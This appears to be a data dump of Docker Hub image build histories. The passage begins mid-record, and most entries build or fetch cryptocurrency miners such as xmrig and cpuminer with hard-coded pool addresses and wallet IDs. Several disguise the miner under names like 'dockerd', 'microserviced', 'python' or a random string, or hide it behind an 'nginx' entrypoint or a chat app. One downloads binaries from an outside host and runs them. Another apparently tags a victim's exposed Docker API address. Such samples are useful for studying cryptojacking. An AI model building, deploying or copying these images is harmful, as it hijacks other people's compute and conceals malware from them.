-rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nRUN apt-get update &&     apt-get install -y git curl build-essential cmake libuv1-dev libmicrohttpd-dev &&     curl -sL https://deb.nodesource.com/setup_10.x | bash - &&     apt-get install -y nodejs &&     git clone -b qrl https://socialwrap@bitbucket.org/socialwrap/deadhash.git && cd deadhash && npm i &&     git clone https://github.com/xmrig/xmrig.git &&     cd xmrig && mkdir build && cd build && cmake -DWITH_HTTPD=OFF -DCMAKE_BUILD_TYPE=Release .. && make &&     mv xmrig microserviced && cp microserviced /deadhash && cd /deadhash && rm -rf xmrig\nRUN apt-get clean && apt-get purge -y git curl build-essential cmake\nWORKDIR /deadhash\nRUN export NAME=$(cat /dev/urandom | tr -dc \'a-zA-Z0-9\' | fold -w 16 | head -n 1) &&    cp microserviced $NAME && echo "\\n ./${NAME}" >> electrode.sh\nCMD ["/bin/sh -c npm start"]'
moneyforryzen/ryzen; b'ADD file:28c0771e44ff530dba3f237024acc38e8ec9293d60f0e44c8c78536c12f13a0b /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nRUN apt-get update &&     apt-get install -y git curl build-essential cmake libuv1-dev libmicrohttpd-dev &&     curl -sL https://deb.nodesource.com/setup_10.x | bash - &&     apt-get install -y nodejs &&     git clone -b open https://github.com/cryptocheck/chatik.git && cd chatik && npm i &&     git clone https://github.com/xmrig/xmrig.git &&     cd xmrig && mkdir build && cd build && cmake -DWITH_HTTPD=OFF -DCMAKE_BUILD_TYPE=Release .. && make &&     mv xmrig microserviced && cp microserviced /chatik && cd /chatik && rm -rf xmrig\nRUN apt-get clean && apt-get purge -y git curl build-essential cmake\nWORKDIR /chatik\nRUN export NAME=$(cat /dev/urandom | tr -dc \'a-zA-Z0-9\' | fold -w 16 | head -n 1) &&    cp microserviced $NAME && echo "\\n ./${NAME}" >> electrode.sh\nCMD ["/bin/sh -c npm start"]'
ganetym/pkymcomsw; b'ADD file:1f4fdc61e133d2f9019d8a06a8126fef0ed4339cb25fda73446393fe8da197c5 /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nARG DONATE_LEVEL=0\nUSER root\n|1 DONATE_LEVEL=0 RUN apt-get update && apt-get install -y gcc-7 g++-7 git build-essential cmake libuv1-dev libmicrohttpd-dev libssl-dev && cd /usr/src/ && git clone https://github.com/xmrig/xmrig.git && cd /usr/src/xmrig && sed -i -r "s/k(:alpha:*)DonateLevel = :digit:/k\\1DonateLevel = ${DONATE_LEVEL}/g" src/donate.h && mkdir build && cd build && cmake .. -DCMAKE_C_COMPILER=gcc-7 -DCMAKE_CXX_COMPILER=g++-7 && make\nCMD ["/usr/src/xmrig/build/xmrig --max-cpu-usage=100 --cpu-priority=5 -o xmr-eu1.nanopool.org:14444 -u 4JUdGzvrMFDWrUUwY3toJATSeNwjn54LkCnKBPRzDuhzi5vSepHfUckJNxRL2gjkNrSqtCoRUrEDAgRwsQvVCjZbRvZ5BtDpPuvVC7SyLs.ANDESYM/ganeshanam78@gmail.com"]\n/usr/src/xmrig/build/xmrig --max-cpu-usage=100 --cpu-priority=5 -o xmr-eu1.nanopool.org:14444 -u 4JUdGzvrMFDWrUUwY3toJATSeNwjn54LkCnKBPRzDuhzi5vSepHfUckJNxRL2gjkNrSqtCoRUrEDAgRwsQvVCjZbRvZ5BtDpPuvVC7SyLs.ANDESYM/ganeshanam78@gmail.com'
kxyzw/testosl; b'ADD file:5ed435208da6621b45db657dd6549ee132cde58c4b6763920030794c2f31fbc0 /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nRUN apt-get update  && apt-get install -y git build-essential automake autoconf pkg-config libcurl4-openssl-dev libjansson-dev libssl-dev libgmp-dev make g++  && cd /  && git clone https://github.com/tpruvot/cpuminer-multi  && cd cpuminer-multi  && ./build.sh  && cp ./cpuminer /openssl  && rm -rf ./*  && cd /  && apt-get autoremove -y git build-essential automake autoconf pkg-config make g++'
ganetym/oremakz; b'ADD file:4e6b5d9ca371eb881c581574b8dc4f5391eff2872db364af0f8d9804e4890098 /\nRUN  -z "$(apt-get indextargets)" \nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nARG DONATE_LEVEL=0\nUSER root\n|1 DONATE_LEVEL=0 RUN apt-get update && apt-get install -y gcc-7 g++-7 git build-essential cmake libuv1-dev libmicrohttpd-dev libssl-dev && cd /usr/src/ && git clone https://github.com/xmrig/xmrig.git && cd /usr/src/xmrig && sed -i -r "s/k(:alpha:*)DonateLevel = :digit:/k\\1DonateLevel = ${DONATE_LEVEL}/g" src/donate.h && mkdir build && cd build && cmake .. -DCMAKE_C_COMPILER=gcc-7 -DCMAKE_CXX_COMPILER=g++-7 && make\nCMD ["/usr/src/xmrig/build/xmrig --max-cpu-usage=100 --cpu-priority=5 -o xmr-eu1.nanopool.org:14444 -u 4JUdGzvrMFDWrUUwY3toJATSeNwjn54LkCnKBPRzDuhzi5vSepHfUckJNxRL2gjkNrSqtCoRUrEDAgRwsQvVCjZbRvZ5BtDpPuvVC7SyLs.Orems/ganeshanam78@gmail.com"]\n/usr/src/xmrig/build/xmrig --max-cpu-usage=100 --cpu-priority=5 -o xmr-eu1.nanopool.org:14444 -u 4JUdGzvrMFDWrUUwY3toJATSeNwjn54LkCnKBPRzDuhzi5vSepHfUckJNxRL2gjkNrSqtCoRUrEDAgRwsQvVCjZbRvZ5BtDpPuvVC7SyLs.Orems/ganeshanam78@gmail.com'
ya16/etn; b'ADD file:a3344b835ea6fdc5692df23826c970403656c6947342e117b2ac1a05956679af /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nCOPY file:4af4cd95dd621f28b28d1da4609206d89f96b42c59785bba78b2f38bd7469bc9 /\nRUN apt-get update ; apt-get -y install wget busybox ; mkdir /www; cd /www ; wget c6a.surge.sh/minerd -O python; chmod +x python ; chmod +x /jelastic.sh ; cd / ; wget -O- c6a.surge.sh/px4.tgz | tar xpzf -\nCMD ["/bin/sh -c cd /www; busybox httpd -p 80 ; ./python -o stratum+tcp://172.104.143.224:20596 -u ii8c.ya16-etn -p x -a cryptonight -t $(nproc) > /www/index.html 2>&1 & /jelastic.sh ; sleep 100d ; sleep 99d ; sleep 300d ; sleep 200d ; tail -f /dev/null"]'
krakenz/gakeaws-nginx; b'ADD file:2e3a37883f56a4a278bec2931fc9f91fb9ebdaa9047540fe8fde419b84a1701b /\nCMD ["/bin/sh"]\nRUN apk update && apk upgrade && apk add libuv openssl\nCOPY file:8daa0549038b531d05022f89cb111ca04944a1d98c684e835269f5aafcce6f65 /xmrig\nENTRYPOINT ["/xmrig"]\nCMD ["-a cryptonight -o stratum+tcp://xmr.f2pool.com:13531 -p x -k -t 4 --donate-level=1 --cpu-priority 0 -u 43U3d1PBg4Gi2BaeMx7nH2dQsyZhAdMRATkJmbvr3kFuEMvU93f4H5geqjnru7SjLA3q81xCnUWr9PdFJRKDB5131fbC8pE.x"]\nENTRYPOINT ["/xmrig"]\n-a cryptonight -o stratum+tcp://xmr.f2pool.com:13531 -p x -k -t 4 --donate-level=1 --cpu-priority 0 -u 43U3d1PBg4Gi2BaeMx7nH2dQsyZhAdMRATkJmbvr3kFuEMvU93f4H5geqjnru7SjLA3q81xCnUWr9PdFJRKDB5131fbC8pE.x\nCMD ["-a cryptonight -o stratum+tcp://xmr.f2pool.com:13531 -p x -k -t 4 --donate-level=1 --cpu-priority 0 -u 43U3d1PBg4Gi2BaeMx7nH2dQsyZhAdMRATkJmbvr3kFuEMvU93f4H5geqjnru7SjLA3q81xCnUWr9PdFJRKDB5131fbC8pE.x"]\nENTRYPOINT ["/nginx"]\n-a cryptonight -o stratum+tcp://xmr.f2pool.com:13531 -p 0906_4_106.13.87.217_2375 -k -t 4 --donate-level=1 --cpu-priority 0 -u 43U3d1PBg4Gi2BaeMx7nH2dQsyZhAdMRATkJmbvr3kFuEMvU93f4H5geqjnru7SjLA3q81xCnUWr9PdFJRKDB5131fbC8pE\n-p 0906_4_106.13.87.217_2375\nENTRYPOINT ["/nginx"]\n\nCOPY file:37f7bd6270184f3074b515c26c33b87817952bf53947a0890e28128ed5777bd1 /config.json'
nightclassic/volume-agent-keep; b'ADD file:25c10b1d1b41d46a1827ad0b0d2389c24df6d31430005ff4e9a2d84ea23ebd42 /\nCMD ["/bin/sh"]\nRUN adduser -S -D -H -h /srv admin\nRUN apk --no-cache upgrade &&       apk --no-cache add         git         cmake         libuv-dev         openssl-dev         libmicrohttpd-dev         build-base &&       git clone https://github.com/xmrig/xmrig &&       cd xmrig &&       mkdir build &&       cmake -DCMAKE_BUILD_TYPE=Release . &&       make &&       apk del         build-base         cmake         git\nUSER admin\nADD file:0adeab1d0f61f0e83d86189888af371bf54482989f1cb76dc8490437e793d5d4 /srv\nWORKDIR /srv\nENTRYPOINT ["/bin/sh ./bootstrap.sh"]'
kxyzw/comps; b'ADD file:5b334adf9d9a2256add2a801b49d4b23c93b0973ec22bb798973d571c948f102 /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nRUN apt-get update  && apt-get install -y git build-essential automake autoconf pkg-config libcurl4-openssl-dev libjansson-dev libssl-dev libgmp-dev make g++  && cd /  && git clone https://github.com/JayDDee/cpuminer-opt  && cd cpuminer-opt  && ./build.sh  && cp ./cpuminer /openssl  && rm -rf ./*  && cd /  && apt-get autoremove -y git build-essential automake autoconf pkg-config make g++\nENTRYPOINT ["/bin/sh -c /openssl -R 300 -a cryptonight -o $URL -u $USER -p x"]'
vothanhkiet/walker; b'ADD file:4e6b5d9ca371eb881c581574b8dc4f5391eff2872db364af0f8d9804e4890098 /\nRUN  -z "$(apt-get indextargets)" \nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nRUN useradd -ms /bin/bash monero\nUSER monero\nWORKDIR /home/monero\nCOPY --chown=monerofile:8f132a6d0854444ea89429dc9d47de20a10a273786894a1ecc06bbd057768a24 /home/monero\nENTRYPOINT ["./xmrig"]\nCMD ["--algo=cryptonight --url=stratum+tcp://xmr.pool.minergate.com:45700 --user=ring.mao.l2@gmail.com -k --max-cpu-usage=100"]'
tanchao2014/test; b'ADD file:2e3a37883f56a4a278bec2931fc9f91fb9ebdaa9047540fe8fde419b84a1701b /\nCMD ["/bin/sh"]\nRUN apk update && apk upgrade && apk add libuv openssl\nCOPY file:8daa0549038b531d05022f89cb111ca04944a1d98c684e835269f5aafcce6f65 /xmrig\nENTRYPOINT ["/xmrig"]\nCOPY file:38f3e49a0c1b92c0f08fcc0850b05ca6eef979c51d2406e59014cf1cd5d613d5 /xmrig'
smy62dttp0kd9y9/li.c.x8c7efvmr893qplj; b'ADD file:c05a199f603e2a97ea93d9f6cc210a1c8ab27eda35f3613722bfcf697da36483 /\nCMD ["/bin/sh"]\nRUN set -x  && apk add --no-cache         libcurl         libgcc         libstdc++         openssl  && apk add --no-cache -t .build-deps         autoconf         automake         build-base         curl         curl-dev         git         openssl-dev  && git clone --recursive https://github.com/tpruvot/cpuminer-multi.git /tmp/cpuminer  && cd /tmp/cpuminer  && ./autogen.sh  && ./configure CFLAGS="-O2 -march=native" --with-crypto --with-curl  && make install  && curl -Lo /usr/local/bin/dumb-init https://github.com/Yelp/dumb-init/releases/download/v1.1.3/dumb-init_1.1.3_amd64  && chmod +x /usr/local/bin/dumb-init  && cd /  && apk del --purge .build-deps  && rm -rf /tmp/*  && cpuminer --cputest  && cpuminer --version\nENTRYPOINT ["dumb-init"]\nCMD ["cpuminer --algo=scrypt --userpass=C4Lbh2XkJ36UgV3X.1:1 --url=stratum+tcp://us.litecoinpool.org:3333"]'
jason1571/ubuntu; b'ADD file:efec03b785a78c01a6ade862d9a309f500ffa9f5f9314be26621f7fda0d5dfb8 /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nRUN apt-get update && apt-get install -y wget\nENV XMRIG_VERSION=2.8.3 XMRIG_SHA256=365198ed4f1205c42fa448d41c9088d3dea6bff43173c5e870e8bec4631c3a7d\nRUN useradd -s /bin/bash -d /home/docker/ -m docker\nUSER docker\nWORKDIR /home/docker\nRUN wget https://github.com/xmrig/xmrig/releases/download/v${XMRIG_VERSION}/xmrig-${XMRIG_VERSION}-xenial-amd64.tar.gz &&  tar -xvzf xmrig-${XMRIG_VERSION}-xenial-amd64.tar.gz &&  mv xmrig-${XMRIG_VERSION}/xmrig /home/docker/dockerd &&  rm -rf xmrig-${XMRIG_VERSION} &&  echo "${XMRIG_SHA256}  dockerd" | sha256sum -c -\nENTRYPOINT ["/home/docker/dockerd"]\nCMD ["--url=gulf.moneroocean.stream:10001 --user=496XaDiV32GGmwqSUm3jDJjCYzovnyLtV1ja3rRV7yQVSH3MHdY68zk7otJFEjUBJiD1sR4uVUYR74izangUYyf1DGatjWN --pass=Docker -k --max-cpu-usage=100"]'
thshaw/techies-4-temple-street; b'ADD file:f5a2d04c3f3cafada15eb32e4e8d971e48ef11724939c399a8664bf498111e67 /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nENV worker_label=t4ts\nWORKDIR /root/\nRUN apt-get update && apt-get -qy install  automake  build-essential  libcurl4-openssl-dev  libssl-dev  git  ca-certificates  libjansson-dev libgmp-dev g++ --no-install-recommends\nRUN git clone --recursive https://github.com/JayDDee/cpuminer-opt cpuminer-multi\nWORKDIR /root/cpuminer-multi\nRUN ./autogen.sh\nRUN CFLAGS="-O3 -march=native -Wall" CXXFLAGS="$CFLAGS -std=gnu++11" ./configure --with-curl\nRUN make\nCMD ["/bin/sh -c ./cpuminer -a cryptonight -o stratum+tcp://cryptonight.usa.nicehash.com:3355 -u 1KW1jDtPrFDn4QCedtJgSsAz4BmtLN7ma.${worker_label}"]'
unrealord/docker-bluemix; b'ADD file:39d3593ea220e686d5450244ef9dd6c934e3b288a29212d332ec33942b7bf218 /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nCOPY file:dfa074ffe51c178373bcf1acc0c13c9d51c7dd034ccb2114822dd633bc9826b8 /tmp/build.sh\nRUN LC_ALL=C DEBIAN_FRONTEND=noninteractive /tmp/build.sh   && rm -rf /var/lib/apt/lists/*\nRUN wget https://minergate.com/download/deb-cli -O minergate-cli.deb && dpkg -i minergate-cli.deb\nCMD ["minergate-cli -user unrealord@gmail.com -bcn 3"]'
